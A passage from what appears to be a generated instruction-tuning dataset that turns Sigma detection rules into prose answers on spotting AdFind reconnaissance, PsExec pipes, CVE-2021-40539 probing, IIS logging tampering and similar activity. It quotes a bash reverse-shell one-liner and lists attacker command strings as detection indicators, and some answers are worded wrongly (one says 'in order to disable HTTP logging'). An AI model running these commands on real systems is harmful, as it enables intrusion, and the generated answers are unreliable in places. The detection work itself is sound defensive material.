      "answer": "In order to detect the use of a renamed AdFind.exe, which continues to be seen across the majority of breaches and is used for domain trust discovery to plan out subsequent steps in the attack chain, you should monitor for the creation of processes on Windows systems that exhibit specific characteristics indicative of such reconnaissance activities. Key indicators include command lines containing references to domain information querying such as 'domainlist,' 'trustdmp,' 'dcmodes,' 'adinfo,' 'dclist,' 'computer_pwdnotreqd,' 'objectcategory=,' '-subnets -f,' 'name=\"Domain Admins\",' '-sc u:,' 'domainncs,' 'dompol,' 'oudmp,' 'subnetdmp,' 'gpodmp,' 'fspdmp,' 'users_noexpire,' 'computers_active,' and 'computers_pwdnotreqd.' Additionally, detection can be bolstered by identifying processes with specific hash values known to be associated with AdFind, specifically bca5675746d13a1f246e2da3c2217492 and 53e117a96057eaf19c41380d0e87f1c2, or processes where the original file name is 'AdFind.exe,' while ensuring to exclude legitimate instances of AdFind.exe. This approach aims at minimizing the risk of overlooking a potentially malicious activity designed to gain insights into domain trusts and facilitate the planning of further malicious operations."
    }
  },
  {
    "instruction": "Can you explain how to detect: deletion of files by the Sysinternals SDelete utility. It looks for the common name pattern used to rename files.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the deletion of files by the Sysinternals SDelete utility, which appears to target files by renaming them with common name patterns, you should: monitor Windows file deletion logs for occurrences where files are renamed to have the '.AAA' or '.ZZZ' extensions, which are indicative of the SDelete utility's operation. However, it's essential to exclude any deletions involving the specific path '\\Wireshark\\radius\\dictionary.alcatel-lucent.aaa' as this could be tied to legitimate activities rather than malicious deletions. This approach focuses on identifying potentially malicious file deletion activity while minimizing false alerts by acknowledging the utility's legitimate use cases. The assessment level for these detections is deemed to be at a medium severity, indicating that while it's critical to monitor for these patterns, they are not always directly associated with the most critical threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "deletion of files by the Sysinternals SDelete utility. It looks for the common name pattern used to rename files.",
      "answer": "In order to detect the deletion of files by the Sysinternals SDelete utility, which appears to target files by renaming them with common name patterns, you should: monitor Windows file deletion logs for occurrences where files are renamed to have the '.AAA' or '.ZZZ' extensions, which are indicative of the SDelete utility's operation. However, it's essential to exclude any deletions involving the specific path '\\Wireshark\\radius\\dictionary.alcatel-lucent.aaa' as this could be tied to legitimate activities rather than malicious deletions. This approach focuses on identifying potentially malicious file deletion activity while minimizing false alerts by acknowledging the utility's legitimate use cases. The assessment level for these detections is deemed to be at a medium severity, indicating that while it's critical to monitor for these patterns, they are not always directly associated with the most critical threats."
    }
  },
  {
    "instruction": "Please help me detect the following: Detecting use PsExec via Pipe Creation/Access to pipes",
    "context": "",
    "output": "Sure!\nIn order to detect the use of PsExec via Pipe Creation/Access to pipes, you should monitor for events related to the creation or access of named pipes in Windows environments. This detection focuses on identifying specific pipe names that commonly indicate the usage of PsExec-like services or tools, such as 'psexec', 'paexec', 'remcom', and 'csexec'. These activities are generally captured through Sysmon, specifically via Event IDs 17 (Pipe Created) and 18 (Pipe Connected), ensuring that Sysmon is properly configured to log named pipe events is critical for successful detection. While some activities detected may be legitimate administrative actions, distinguishing between typical administrative use and potential malicious activity is crucial. The detection of such activities falls under tactics and techniques commonly associated with Execution and Lateral Movement, with an emphasis on alerting to medium-level threats represented by the creation or access of named pipes that start with specific names indicative of tools used for remote command execution or lateral movement.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detecting use PsExec via Pipe Creation/Access to pipes",
      "answer": "In order to detect the use of PsExec via Pipe Creation/Access to pipes, you should monitor for events related to the creation or access of named pipes in Windows environments. This detection focuses on identifying specific pipe names that commonly indicate the usage of PsExec-like services or tools, such as 'psexec', 'paexec', 'remcom', and 'csexec'. These activities are generally captured through Sysmon, specifically via Event IDs 17 (Pipe Created) and 18 (Pipe Connected), ensuring that Sysmon is properly configured to log named pipe events is critical for successful detection. While some activities detected may be legitimate administrative actions, distinguishing between typical administrative use and potential malicious activity is crucial. The detection of such activities falls under tactics and techniques commonly associated with Execution and Lateral Movement, with an emphasis on alerting to medium-level threats represented by the creation or access of named pipes that start with specific names indicative of tools used for remote command execution or lateral movement."
    }
  },
  {
    "instruction": "How can I detect: Triggers on any Sysmon \"FileExecutableDetected\" event, which triggers every time a PE that is monitored by the config is created.",
    "context": "",
    "output": "In order to trigger on any Sysmon \"FileExecutableDetected\" event, which triggers every time a PE that is monitored by the config is created, you should: focus on monitoring Windows systems using Sysmon service. Specifically, set up alerts for Event ID 29, which corresponds to the Sysmon event for \"FileExecutableDetected.\" This event is significant because it is triggered whenever a Portable Executable file (PE), which is under surveillance by the system's configuration, gets created. Due to the nature of this detection targeting a critical step in numerous attack sequences \u2013 the creation of executable files on the system \u2013 false positives are considered unlikely. The importance of closely monitoring such events is rated at a medium level, indicating a balanced approach between alert sensitivity and the potential for false alarms. This procedure is tied to tactics and techniques like Execution and Persistence, which attackers often exploit by creating or modifying executable files to execute malicious code or maintain their presence on a system.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Triggers on any Sysmon \"FileExecutableDetected\" event, which triggers every time a PE that is monitored by the config is created.",
      "answer": "In order to trigger on any Sysmon \"FileExecutableDetected\" event, which triggers every time a PE that is monitored by the config is created, you should: focus on monitoring Windows systems using Sysmon service. Specifically, set up alerts for Event ID 29, which corresponds to the Sysmon event for \"FileExecutableDetected.\" This event is significant because it is triggered whenever a Portable Executable file (PE), which is under surveillance by the system's configuration, gets created. Due to the nature of this detection targeting a critical step in numerous attack sequences \u2013 the creation of executable files on the system \u2013 false positives are considered unlikely. The importance of closely monitoring such events is rated at a medium level, indicating a balanced approach between alert sensitivity and the potential for false alarms. This procedure is tied to tactics and techniques like Execution and Persistence, which attackers often exploit by creating or modifying executable files to execute malicious code or maintain their presence on a system."
    }
  },
  {
    "instruction": "How can I detect: DNS-answer with TTL <10.",
    "context": "",
    "output": "In order to detect DNS-answer with TTL <10, you should: monitor DNS logs for responses that have a TTL (Time to Live) less than 10 seconds, which can indicate suspicious or malicious activity. Specifically, focus on responses where any answer is provided (indicating a successful query response) and the TTL value for the response is greater than 0 but less than 10 seconds. Additionally, it is important to observe the rate at which these responses occur; if more than 3 such responses are identified coming from the same source IP address within a 30-second window, it warrants attention. The detection of such activity is considered to be of medium severity and aligns with tactics and techniques that involve the exploitation of DNS for command and control or other malicious purposes.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "DNS-answer with TTL <10.",
      "answer": "In order to detect DNS-answer with TTL <10, you should: monitor DNS logs for responses that have a TTL (Time to Live) less than 10 seconds, which can indicate suspicious or malicious activity. Specifically, focus on responses where any answer is provided (indicating a successful query response) and the TTL value for the response is greater than 0 but less than 10 seconds. Additionally, it is important to observe the rate at which these responses occur; if more than 3 such responses are identified coming from the same source IP address within a 30-second window, it warrants attention. The detection of such activity is considered to be of medium severity and aligns with tactics and techniques that involve the exploitation of DNS for command and control or other malicious purposes."
    }
  },
  {
    "instruction": "Explain how should I detect the following: suspicious access to URLs that was noticed in cases in which attackers exploitated the ADSelfService vulnerability CVE-2021-40539",
    "context": "",
    "output": "In order to detect suspicious access to URLs that was noticed in cases in which attackers exploited the ADSelfService vulnerability CVE-2021-40539, you should: Monitor your web server logs for access attempts to specific suspicious URLs. The URLs to be on the lookout for include '/help/admin-guide/Reports/ReportGenerate.jsp', '/ServletApi/../RestApi/LogonCustomization', and '/ServletApi/../RestAPI/Connection'. These URLs have been linked to exploitation attempts of the aforementioned vulnerability. If such access attempts are found in the logs, it indicates a high possibility of an attack, and further investigation should be conducted. Be aware that, due to the specificity of the URLs monitored, the chances for false positives are considered unknown, signifying that while detections may not commonly occur, each should be treated with significant concern and investigated thoroughly.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious access to URLs that was noticed in cases in which attackers exploitated the ADSelfService vulnerability CVE-2021-40539",
      "answer": "In order to detect suspicious access to URLs that was noticed in cases in which attackers exploited the ADSelfService vulnerability CVE-2021-40539, you should: Monitor your web server logs for access attempts to specific suspicious URLs. The URLs to be on the lookout for include '/help/admin-guide/Reports/ReportGenerate.jsp', '/ServletApi/../RestApi/LogonCustomization', and '/ServletApi/../RestAPI/Connection'. These URLs have been linked to exploitation attempts of the aforementioned vulnerability. If such access attempts are found in the logs, it indicates a high possibility of an attack, and further investigation should be conducted. Be aware that, due to the specificity of the URLs monitored, the chances for false positives are considered unknown, signifying that while detections may not commonly occur, each should be treated with significant concern and investigated thoroughly."
    }
  },
  {
    "instruction": "Can you explain how to detect: bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')",
    "context": "",
    "output": "Certainly!\n\nIn order to detect a bash connecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'), you should monitor network connections initiated by the Linux system, specifically focusing on those originating from the bash shell. Look for instances where bash is making external network connections, but exclude any connections to common local IP addresses such as '127.0.0.1' and '0.0.0.0' to minimize false positives. This approach is critical in identifying potential malicious activity where bash is used to establish a connection with an external server, possibly for command and control communication or data exfiltration.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')",
      "answer": "In order to detect a bash connecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'), you should monitor network connections initiated by the Linux system, specifically focusing on those originating from the bash shell. Look for instances where bash is making external network connections, but exclude any connections to common local IP addresses such as '127.0.0.1' and '0.0.0.0' to minimize false positives. This approach is critical in identifying potential malicious activity where bash is used to establish a connection with an external server, possibly for command and control communication or data exfiltration."
    }
  },
  {
    "instruction": "How to detect: Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union)",
    "context": "",
    "output": "In order to disable HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union), you should monitor for the creation of processes on Windows systems that exhibit very specific characteristics indicative of this malicious activity. Focus on any process that is initiated with the 'appcmd.exe' application, which is a command-line utility for managing IIS. Specifically, look out for processes where the image ends with '\\appcmd.exe' or has an original filename of 'appcmd.exe'. Additionally, pay close attention to the command-line parameters. If the command line contains the strings 'set', 'config', 'section:httplogging', and 'dontLog:true' simultaneously, it indicates an attempt to disable HTTP logging. These detection parameters are crucial for identifying efforts to interfere with web server auditing capabilities, aligning with tactics and techniques associated with malicious cyber operations. Note that any alerts triggered by these conditions should be treated with a high level of suspicion due to the potential for false positives being unknown, indicating the seriousness of detecting such activity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union)",
      "answer": "In order to disable HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union), you should monitor for the creation of processes on Windows systems that exhibit very specific characteristics indicative of this malicious activity. Focus on any process that is initiated with the 'appcmd.exe' application, which is a command-line utility for managing IIS. Specifically, look out for processes where the image ends with '\\appcmd.exe' or has an original filename of 'appcmd.exe'. Additionally, pay close attention to the command-line parameters. If the command line contains the strings 'set', 'config', 'section:httplogging', and 'dontLog:true' simultaneously, it indicates an attempt to disable HTTP logging. These detection parameters are crucial for identifying efforts to interfere with web server auditing capabilities, aligning with tactics and techniques associated with malicious cyber operations. Note that any alerts triggered by these conditions should be treated with a high level of suspicion due to the potential for false positives being unknown, indicating the seriousness of detecting such activity."
    }
  },
  {
    "instruction": "Please help me detect the following: logons using NTLM to hosts that are potentially not part of the domain.",
    "context": "",
    "output": "Sure!\nIn order to detect logons using NTLM to hosts that are potentially not part of the domain, you should monitor the operational logs from the Microsoft-Windows-NTLM service. Focus specifically on events with an ID of 8001, which indicate an NTLM authentication attempt. These attempts become particularly noteworthy when the target name of the authentication starts with 'TERMSRV', as this prefix is commonly associated with Terminal Services or Remote Desktop Services, and could indicate an attempt to access resources outside of the domain.\n\nCollect data fields such as the Computer name, Username, Domain Name, and Target Name during these events to help identify the source and target of the NTLM authentication attempts. Be cautious of false positives which may arise from legitimate host connections to valid domains, connections that do not use the Fully Qualified Domain Name (FQDN), and connections to external but legitimate domains. These can be safely excluded from alerts to minimize noise.\n\nThis monitoring strategy is aligned with identifying potentially malicious activities related to Credential Access and Lateral Movement, specifically focusing on suspicious NTLM logons that may indicate an adversary's attempt to move laterally within a network or access resources using compromised credentials.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "logons using NTLM to hosts that are potentially not part of the domain.",
      "answer": "In order to detect logons using NTLM to hosts that are potentially not part of the domain, you should monitor the operational logs from the Microsoft-Windows-NTLM service. Focus specifically on events with an ID of 8001, which indicate an NTLM authentication attempt. These attempts become particularly noteworthy when the target name of the authentication starts with 'TERMSRV', as this prefix is commonly associated with Terminal Services or Remote Desktop Services, and could indicate an attempt to access resources outside of the domain.\n\nCollect data fields such as the Computer name, Username, Domain Name, and Target Name during these events to help identify the source and target of the NTLM authentication attempts. Be cautious of false positives which may arise from legitimate host connections to valid domains, connections that do not use the Fully Qualified Domain Name (FQDN), and connections to external but legitimate domains. These can be safely excluded from alerts to minimize noise.\n\nThis monitoring strategy is aligned with identifying potentially malicious activities related to Credential Access and Lateral Movement, specifically focusing on suspicious NTLM logons that may indicate an adversary's attempt to move laterally within a network or access resources using compromised credentials."
    }
  },
  {
    "instruction": "How can I detect: scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking.",
    "context": "",
    "output": "In order to detect scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking, you should: monitor Windows security logs for events with ID 4738, which indicates a change to a user account's properties. Specifically, look for changes in the User Account Control (UAC) values that suggest the enabling of weak encryption mechanisms. This includes transitioning from a state without the descriptors associated with DES encryption, pre-authentication not required, or encryption not required to a state that indicates these weaker security settings. It is critical to identify when old UAC values that do not end in hexadecimal patterns indicating these weaker settings (for example, not ending in 8, 9, A, B, C, D, E, or F for DES encryption; not ending in 1, 3, 5, 7, 9, B, D, or F for pre-authentication not required; and not ending in 8, 9, A, B, C, D, E, or F for encryption not required) shift to new UAC values that do end in these patterns. This suggests that an account's configuration has been altered to use less secure encryption methods, which could potentially facilitate attacks like cracking hashes or passwords. It's important to have an audit policy in place for account management and specifically to audit user account management events to catch changes like these. Be aware that not all changes indicating a switch to weaker encryption settings are malicious, but they do warrant a high level of scrutiny due to the elevated risk they represent.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking.",
      "answer": "In order to detect scenario where weak encryption is enabled for a user profile which could be used for hash/password cracking, you should: monitor Windows security logs for events with ID 4738, which indicates a change to a user account's properties. Specifically, look for changes in the User Account Control (UAC) values that suggest the enabling of weak encryption mechanisms. This includes transitioning from a state without the descriptors associated with DES encryption, pre-authentication not required, or encryption not required to a state that indicates these weaker security settings. It is critical to identify when old UAC values that do not end in hexadecimal patterns indicating these weaker settings (for example, not ending in 8, 9, A, B, C, D, E, or F for DES encryption; not ending in 1, 3, 5, 7, 9, B, D, or F for pre-authentication not required; and not ending in 8, 9, A, B, C, D, E, or F for encryption not required) shift to new UAC values that do end in these patterns. This suggests that an account's configuration has been altered to use less secure encryption methods, which could potentially facilitate attacks like cracking hashes or passwords. It's important to have an audit policy in place for account management and specifically to audit user account management events to catch changes like these. Be aware that not all changes indicating a switch to weaker encryption settings are malicious, but they do warrant a high level of scrutiny due to the elevated risk they represent."
    }
  },
  {
    "instruction": "How can I detect: disabling Windows Defender PUA protection",
    "context": "",
    "output": "In order to detect disabling Windows Defender PUA protection, you should: Monitor registry setting changes on Windows systems, specifically focusing on the category of registry_set. Look for events where the EventType is SetValue, indicating that a registry value has been modified. The primary target to watch is modifications to the registry key path that includes '\\Policies\\Microsoft\\Windows Defender\\PUAProtection'. The specific alteration to be alert for is when the Details of the modification show a DWORD value set to '0x00000000', which effectively disables the Windows Defender's potentially unwanted application (PUA) protection feature. This detection strategy is critical as it helps identify attempts to weaken the security of a system by turning off PUA protection, which is a common tactic used by attackers to avoid detection. While monitoring for this behavior, be aware that false positive occurrences are unknown, indicating that any detection should be taken seriously and investigated. The significance of such monitoring is underscored by its high level of importance in maintaining system security against tactics and techniques that involve the disabling of protective measures meant to block potentially harmful software.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "disabling Windows Defender PUA protection",
      "answer": "In order to detect disabling Windows Defender PUA protection, you should: Monitor registry setting changes on Windows systems, specifically focusing on the category of registry_set. Look for events where the EventType is SetValue, indicating that a registry value has been modified. The primary target to watch is modifications to the registry key path that includes '\\Policies\\Microsoft\\Windows Defender\\PUAProtection'. The specific alteration to be alert for is when the Details of the modification show a DWORD value set to '0x00000000', which effectively disables the Windows Defender's potentially unwanted application (PUA) protection feature. This detection strategy is critical as it helps identify attempts to weaken the security of a system by turning off PUA protection, which is a common tactic used by attackers to avoid detection. While monitoring for this behavior, be aware that false positive occurrences are unknown, indicating that any detection should be taken seriously and investigated. The significance of such monitoring is underscored by its high level of importance in maintaining system security against tactics and techniques that involve the disabling of protective measures meant to block potentially harmful software."
    }
  },
  {
    "instruction": "Can you explain how to detect: use of Rundll32 to launch an NSIS module that serves as the main stealer capability of Rhadamanthys infostealer, as observed in reports and samples in early 2023",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the use of Rundll32 to launch an NSIS module that serves as the main stealer capability of Rhadamanthys infostealer, as observed in reports and samples in early 2023, you should: Focus on monitoring process creation events on Windows systems. Key identifiers include processes that have originated from \"RUNDLL32.EXE\" or any process whose image path ends with \"\\rundll32.exe\". Additionally, look for command lines that contain the string 'nsis_uns', which indicates the invocation of an NSIS module. Another critical indicator is the presence of 'PrintUIEntry' in the command line, signifying the export function being leveraged. All these conditions should be met to indicate a potential detection. It's important to be aware that due to the nature of these indicators, there may be some unknown false positives, and the severity level of this detection is considered medium. This approach aligns with understanding and mitigating tactics and techniques associated with the deployment and execution of malicious software, specifically focusing on the Rhadamanthys infostealer's use of Rundll32 with NSIS modules in its operations.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of Rundll32 to launch an NSIS module that serves as the main stealer capability of Rhadamanthys infostealer, as observed in reports and samples in early 2023",
      "answer": "In order to detect the use of Rundll32 to launch an NSIS module that serves as the main stealer capability of Rhadamanthys infostealer, as observed in reports and samples in early 2023, you should: Focus on monitoring process creation events on Windows systems. Key identifiers include processes that have originated from \"RUNDLL32.EXE\" or any process whose image path ends with \"\\rundll32.exe\". Additionally, look for command lines that contain the string 'nsis_uns', which indicates the invocation of an NSIS module. Another critical indicator is the presence of 'PrintUIEntry' in the command line, signifying the export function being leveraged. All these conditions should be met to indicate a potential detection. It's important to be aware that due to the nature of these indicators, there may be some unknown false positives, and the severity level of this detection is considered medium. This approach aligns with understanding and mitigating tactics and techniques associated with the deployment and execution of malicious software, specifically focusing on the Rhadamanthys infostealer's use of Rundll32 with NSIS modules in its operations."
    }
  },
  {
    "instruction": "Explain how should I detect the following: OilRig schedule task persistence as reported by Nyotron in their March 2018 report",
    "context": "",
    "output": "In order to detect OilRig schedule task persistence as reported by Nyotron in their March 2018 report, you should: Monitor the Windows System log for events generated by the Service Control Manager with an EventID of 7045, which indicates a service was installed on the system. Specifically, watch for services named 'SC Scheduled Scan' or 'UpdatMachine' being created. The appearance of these services being installed can be an indicator of persistence mechanisms set up by an attacker, aligning with tactics typically used in OilRig campaigns. It is considered highly unlikely that these events constitute false positives and the identification of such events should be treated with a critical level of concern, emphasizing the potential severity of detecting such tactics in the environment.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "OilRig schedule task persistence as reported by Nyotron in their March 2018 report",
      "answer": "In order to detect OilRig schedule task persistence as reported by Nyotron in their March 2018 report, you should: Monitor the Windows System log for events generated by the Service Control Manager with an EventID of 7045, which indicates a service was installed on the system. Specifically, watch for services named 'SC Scheduled Scan' or 'UpdatMachine' being created. The appearance of these services being installed can be an indicator of persistence mechanisms set up by an attacker, aligning with tactics typically used in OilRig campaigns. It is considered highly unlikely that these events constitute false positives and the identification of such events should be treated with a critical level of concern, emphasizing the potential severity of detecting such tactics in the environment."
    }
  },
  {
    "instruction": "Please help me detect the following: execution of Scheduled Tasks where the program being run is located in a suspicious location or where it is an unusual program to be run from a Scheduled Task",
    "context": "",
    "output": "Sure!\nIn order to detect the execution of Scheduled Tasks where the program being run is located in a suspicious location or where it is an unusual program to be run from a Scheduled Task, you should monitor for specific event IDs and file paths that indicate the creation of a task which triggers the execution of programs not typically associated with scheduled tasks. \n\nFocusing on the Windows Task Scheduler service, especially looking for Event ID 129, which signifies the creation of a task process, is crucial. The detection is more effective if the Task Scheduler's operational logs are enabled, as they are disabled by default. \n\nPay particular attention to tasks that are initiating programs such as Calculator, Command Scripting Utility (CScript), Microsoft HTML Application Host (mshta), Microsoft Paint, Notepad, Microsoft Register Server (regsvr32), and Windows Script Host (wscript). These applications are generally not expected to be launched via scheduled tasks in most secure environments, their usage in such a manner can signify malicious intent, like an attacker seeking to execute code or scripts surreptitiously.\n\nHowever, it's important to note that some legitimate tasks might use these programs. Therefore, an analysis that considers the context in which these applications are used, and possibly excluding known and trusted tasks that use them, is crucial to reduce false positives and focus on genuinely suspicious activity. This nuanced approach is necessary to differentiate between benign and malicious task creations effectively.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of Scheduled Tasks where the program being run is located in a suspicious location or where it is an unusual program to be run from a Scheduled Task",
      "answer": "In order to detect the execution of Scheduled Tasks where the program being run is located in a suspicious location or where it is an unusual program to be run from a Scheduled Task, you should monitor for specific event IDs and file paths that indicate the creation of a task which triggers the execution of programs not typically associated with scheduled tasks. \n\nFocusing on the Windows Task Scheduler service, especially looking for Event ID 129, which signifies the creation of a task process, is crucial. The detection is more effective if the Task Scheduler's operational logs are enabled, as they are disabled by default. \n\nPay particular attention to tasks that are initiating programs such as Calculator, Command Scripting Utility (CScript), Microsoft HTML Application Host (mshta), Microsoft Paint, Notepad, Microsoft Register Server (regsvr32), and Windows Script Host (wscript). These applications are generally not expected to be launched via scheduled tasks in most secure environments, their usage in such a manner can signify malicious intent, like an attacker seeking to execute code or scripts surreptitiously.\n\nHowever, it's important to note that some legitimate tasks might use these programs. Therefore, an analysis that considers the context in which these applications are used, and possibly excluding known and trusted tasks that use them, is crucial to reduce false positives and focus on genuinely suspicious activity. This nuanced approach is necessary to differentiate between benign and malicious task creations effectively."
    }
  },
  {
    "instruction": "Can you explain how to detect: removal of an exported Exchange mailbox which could be to cover tracks from ProxyShell exploit",
    "context": "",
    "output": "Certainly!\n\nIn order to detect removal of an exported Exchange mailbox which could be to cover tracks from ProxyShell exploit, you should: Monitor logs from Microsoft Exchange Management services on Windows systems for specific activities that indicate a removal of an exported Exchange mailbox. Look for events that contain the keyword 'Remove-MailboxExportRequest' in combination with ' -Identity ' and ' -Confirm \"False\"'. These are commands executed to delete mailbox export requests without requiring confirmation, which could be an attempt to erase evidence or manipulate data post-compromise, especially in the context of a ProxyShell exploit. It's important to approach detected instances with high caution as this behavior is considered highly suspicious, although be aware that there might be unknown scenarios that could trigger false positives. This activity correlates with tactics and techniques typically used in post-exploitation stages of an attack, aiming at evasion and covering tracks.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "removal of an exported Exchange mailbox which could be to cover tracks from ProxyShell exploit",
      "answer": "In order to detect removal of an exported Exchange mailbox which could be to cover tracks from ProxyShell exploit, you should: Monitor logs from Microsoft Exchange Management services on Windows systems for specific activities that indicate a removal of an exported Exchange mailbox. Look for events that contain the keyword 'Remove-MailboxExportRequest' in combination with ' -Identity ' and ' -Confirm \"False\"'. These are commands executed to delete mailbox export requests without requiring confirmation, which could be an attempt to erase evidence or manipulate data post-compromise, especially in the context of a ProxyShell exploit. It's important to approach detected instances with high caution as this behavior is considered highly suspicious, although be aware that there might be unknown scenarios that could trigger false positives. This activity correlates with tactics and techniques typically used in post-exploitation stages of an attack, aiming at evasion and covering tracks."
    }
  },
  {
    "instruction": "Explain how should I detect the following: owner is was removed from a application or service principal in Azure.",
    "context": "",
    "output": "In order to identify when an owner was removed from an application or service principal in Azure, you should: Monitor Azure activity logs specifically for messages indicating either \"Remove owner from service principal\" or \"Remove owner from application\". This involves keeping an eye on activities within the Azure environment to detect unauthorized modifications which can be indicative of malicious attempts to alter permissions or reduce the security posture of applications and services. It's important to note that while such removal actions can be part of regular administrative duties, they might also signify malicious activities. Hence, it's advisable to verify such actions, especially if they come from unfamiliar users, user agents, or originate from unexpected hostnames. If you determine that changes made are known behaviors and causing false alarms, you can adjust this monitoring rule to avoid unnecessary alerts. This detection carries a medium level of importance due to its potential implications on security and access controls.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "owner is was removed from a application or service principal in Azure.",
      "answer": "In order to identify when an owner was removed from an application or service principal in Azure, you should: Monitor Azure activity logs specifically for messages indicating either \"Remove owner from service principal\" or \"Remove owner from application\". This involves keeping an eye on activities within the Azure environment to detect unauthorized modifications which can be indicative of malicious attempts to alter permissions or reduce the security posture of applications and services. It's important to note that while such removal actions can be part of regular administrative duties, they might also signify malicious activities. Hence, it's advisable to verify such actions, especially if they come from unfamiliar users, user agents, or originate from unexpected hostnames. If you determine that changes made are known behaviors and causing false alarms, you can adjust this monitoring rule to avoid unnecessary alerts. This detection carries a medium level of importance due to its potential implications on security and access controls."
    }
  },
  {
    "instruction": "Can you explain how to detect: network connections from \"dfsvc.exe\" used to handled ClickOnce applications to uncommon ports",
    "context": "",
    "output": "Certainly!\n\nIn order to detect network connections from \"dfsvc.exe\" used to handled ClickOnce applications to uncommon ports, you should: Look for instances where the executable file \"dfsvc.exe\" initiates a network connection from a Windows system, indicating activity related to handling ClickOnce applications. Specifically, focus on network connections that use ports other than the common ones, such as 80 (HTTP), 443 (HTTPS), and 445 (Microsoft-DS SMB file sharing). Any connection by \"dfsvc.exe\" not using these listed ports should be scrutinized, as it may represent an attempt to communicate over less typical, potentially suspicious ports. This detection is tagged with tactics and techniques related to its operational impact, but remember to account for legitimate applications that may occasionally use different ports, leading to potential unknown false positives. The severity level assigned to this kind of detection is considered medium, reflecting its importance in identifying potentially malicious activity while also acknowledging the possibility of legitimate exceptions.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "network connections from \"dfsvc.exe\" used to handled ClickOnce applications to uncommon ports",
      "answer": "In order to detect network connections from \"dfsvc.exe\" used to handled ClickOnce applications to uncommon ports, you should: Look for instances where the executable file \"dfsvc.exe\" initiates a network connection from a Windows system, indicating activity related to handling ClickOnce applications. Specifically, focus on network connections that use ports other than the common ones, such as 80 (HTTP), 443 (HTTPS), and 445 (Microsoft-DS SMB file sharing). Any connection by \"dfsvc.exe\" not using these listed ports should be scrutinized, as it may represent an attempt to communicate over less typical, potentially suspicious ports. This detection is tagged with tactics and techniques related to its operational impact, but remember to account for legitimate applications that may occasionally use different ports, leading to potential unknown false positives. The severity level assigned to this kind of detection is considered medium, reflecting its importance in identifying potentially malicious activity while also acknowledging the possibility of legitimate exceptions."
    }
  },
  {
    "instruction": "How can I detect: unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity",
    "context": "",
    "output": "In order to detect unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity, you should monitor process creation events on Windows systems, focusing on the relationships between parent and child processes specifically involving wab.exe and wabmig.exe. Special attention should be given to scenarios where these processes are spawned by or spawn known suspicious executables, such as WmiPrvSE.exe, svchost.exe, or dllhost.exe. Identifying unfamiliar or unexpected parent-child process associations involving these specific executables could be indicative of malicious activities. The detection strategy labels this as exhibiting a high level of threat due to the potential for misuse in bumblebee-related cyber attacks, even though there might be instances where the activity is benign, the occurrence of false positives is acknowledged as unknown.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity",
      "answer": "In order to detect unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity, you should monitor process creation events on Windows systems, focusing on the relationships between parent and child processes specifically involving wab.exe and wabmig.exe. Special attention should be given to scenarios where these processes are spawned by or spawn known suspicious executables, such as WmiPrvSE.exe, svchost.exe, or dllhost.exe. Identifying unfamiliar or unexpected parent-child process associations involving these specific executables could be indicative of malicious activities. The detection strategy labels this as exhibiting a high level of threat due to the potential for misuse in bumblebee-related cyber attacks, even though there might be instances where the activity is benign, the occurrence of false positives is acknowledged as unknown."
    }
  },
  {
    "instruction": "How to detect: default \"UserName\" used by the DiagTrackEoP POC",
    "context": "",
